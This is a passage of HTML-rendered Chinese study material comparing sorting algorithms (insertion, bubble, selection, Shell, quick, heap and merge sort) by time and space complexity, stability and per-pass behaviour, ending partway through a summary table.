style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，在实际应用中常常优于其他排序算法。</p>
<p>归并排序同样基于分治的思想，但由于其分割子序列与初始序列的排列无关，因此它的最好、最坏和平均时间复杂度均为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>从空间复杂度看</strong></p>
<p>简单选择排序、插入排序、冒泡排序、希尔排序和堆排序都仅需借助常数个辅助空间。</p>
<p>快速排序需要借助一个递归工作栈，平均大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，当然在最坏情况下可能会增长到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>2 路归并排序在合并操作中需要借助较多的辅助空间用于元素复制，大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，虽然有方法能克服这个缺点，但其代价是算法会很复杂而且时间复杂度会增加。</p>
</li>
<li>
<p><strong>从稳定性看</strong></p>
<p>插入排序、冒泡排序、归并排序和基数排序是稳定的排序方法，而简单选择排序、快速排序、希尔排序和堆排序都是不稳定的排序方法。平均时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的稳定排序算法只有归并排序，对于不稳定的排序方法，只需举出一个不稳定的实例即可。</p>
</li>
<li>
<p><strong>从过程特征看</strong></p>
<p>采用不同的排序算法，在一次循环或几次循环后的排序结果可能是不同的。如冒泡排序和堆排序在每趟处理后都能产生当前的最大值或最小值，而快速排序一趟处理至少能确定一个元素的最终位置等。</p>
</li>
</ol>
<p>下表列出了各种排序算法的时空复杂度和稳定性情况，其中空间复杂度仅列举了平均情况的复杂度，由于希尔排序的时间复杂度依赖于增量函数，所以无法准确给出其时间复杂度。</p>
<table>
<thead>
<tr>
<th style="text-align:center">算法种类</th>
<th style="text-align:center">时间复杂度<br>最好情况</th>
<th style="text-align:center">时间复杂度<br>平均情况</th>
<th style="text-align:center">时间复杂度<br>最坏情况</th>
<th style="text-align:center">空间复杂度</th>
<th style="text-align:center">是否稳定</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">直接插入排序</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">是</td>
</tr>
<tr>
<td style="text-align:center">冒泡排序</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">是</td>
</tr>
<tr>
<td style="text-align:center">简单选择排序</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">否</td>
</tr>
<tr>
<td style="text-align:center">希尔排序</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">否</td>
</tr>
<tr>
<td style="text-align:center">快速排序</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">否</td>
</tr>
<tr>
<td style="text-align:center">堆排序</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center">否</td>
</tr>
<tr>
<td style="text-align:center">2 路归并排序</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n log_{2} n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></td>
